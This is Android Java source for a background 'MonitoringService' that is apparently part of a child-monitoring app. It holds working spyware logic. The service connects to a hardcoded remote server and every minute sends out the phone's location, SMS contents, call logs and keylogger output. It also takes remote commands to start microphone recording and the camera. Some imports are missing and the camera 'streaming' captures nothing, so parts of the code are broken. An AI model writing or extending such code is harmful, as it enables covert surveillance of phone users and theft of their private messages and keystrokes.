package com.xyz.child;

import android.accessibilityservice.AccessibilityService;
import android.app.Service;
import android.app.usage.UsageStatsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.Telephony;
import android.view.Surface;
import androidx.core.app.NotificationCompat;

import com.xyz.child.KeylogAccessibilityService;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;

public class MonitoringService extends Service {
    private static final String SERVER_HOST = "192.168.1.100"; // Configured via CLI
    private static final int SERVER_PORT = 8080; // Configured via CLI
    private static final String CLIENT_ID = "child_device_001";
    private static final String CLIENT_SECRET = "secure_password";
    private MediaRecorder recorder;
    private File audioFile;
    private Thread monitoringThread;
    private static SSLSocket socket;
    private boolean isAudioRecording = false;
    private boolean isCameraStreaming = false;
    private CameraDevice cameraDevice;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "monitoring_channel")
                .setContentTitle("Parental Monitoring")
                .setContentText("Running in background")
                .setSmallIcon(R.drawable.ic_notification);
        startForeground(1, builder.build());

        monitoringThread = new Thread(this::monitor);
        monitoringThread.start();
        return START_STICKY;
    }

    private void monitor() {
        try {
            SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
            socket = (SSLSocket) factory.createSocket(SERVER_HOST, SERVER_PORT);
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            // Authenticate
            out.println("{\"client_id\":\"" + CLIENT_ID + "\",\"secret\":\"" + CLIENT_SECRET + "\"}");
            String response = in.readLine();
            if (!"AUTH_SUCCESS".equals(response)) {
                return;
            }

            // Command listener
            new Thread(() -> {
                try {
                    while (true) {
                        String command = in.readLine();
                        if (command != null) {
                            handleCommand(command);
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }).start();

            // Periodic data collection
            while (true) {
                sendLocation();
                sendAppUsage();
                sendSmsLogs();
                sendCallLogs();
                sendKeyLogs();
                Thread.sleep(60000); // Send every minute
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void handleCommand(String command) {
        switch (command) {
            case "start_audio":
                startAudioRecording();
                break;
            case "stop_audio":
                stopAudioRecording();
                break;
            case "start_camera":
                startCameraStreaming();
                break;
            case "stop_camera":
                stopCameraStreaming();
                break;
        }
    }

    private void sendLocation() {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location != null) {
                sendData("location", location.getLatitude() + "," + location.getLongitude());
            }
        }
    }

    private void sendAppUsage() {
        UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
        // Requires PACKAGE_USAGE_STATS permission
        sendData("app_usage", "Placeholder: App usage data");
    }

    private void startAudioRecording() {
        if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED && !isAudioRecording) {
            recorder = new MediaRecorder();
            audioFile = new File(getExternalFilesDir(Environment.DIRECTORY_RECORDINGS), "audio_" + System.currentTimeMillis() + ".3gp");
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile);
            try {
                recorder.prepare();
                recorder.start();
                isAudioRecording = true;
                sendData("audio", "Recording started: " + audioFile.getAbsolutePath());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void stopAudioRecording() {
        if (isAudioRecording) {
            recorder.stop();
            recorder.release();
            isAudioRecording = false;
            sendData("audio", "Recording stopped: " + audioFile.getAbsolutePath());
        }
    }

    private void startCameraStreaming() {
        if (checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED && !isCameraStreaming) {
            CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            try {
                String cameraId = manager.getCameraIdList()[0]; // Front or back camera
                manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(CameraDevice camera) {
                        cameraDevice = camera;
                        isCameraStreaming = true;
                        sendData("camera", "Streaming started");
                    }
                    @Override
                    public void onDisconnected(CameraDevice camera) {}
                    @Override
                    public void onError(CameraDevice camera, int error) {}
                }, new Handler());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void stopCameraStreaming() {
        if (isCameraStreaming) {
            cameraDevice.close();
            isCameraStreaming = false;
            sendData("camera", "Streaming stopped");
        }
    }

    private void sendSmsLogs() {
        if (checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    sendData("sms", number + " - " + body);
                }
                cursor.close();
            }
        }
    }

    private void sendCallLogs() {
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String date = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    sendData("call_log", number + " - " + date);
                }
                cursor.close();
            }
        }
    }

    private void sendKeyLogs() {
        // Keylogs are sent via Accessibility Service
        sendData("keylog", KeylogAccessibilityService.getKeyLogs());
    }

    public static void sendData(String type, String data) {
        try {
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            out.println("{\"client_id\":\"" + CLIENT_ID + "\",\"type\":\"" + type + "\",\"data\":\"" + data + "\",\"timestamp\":\"" + new Date() + "\"}");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}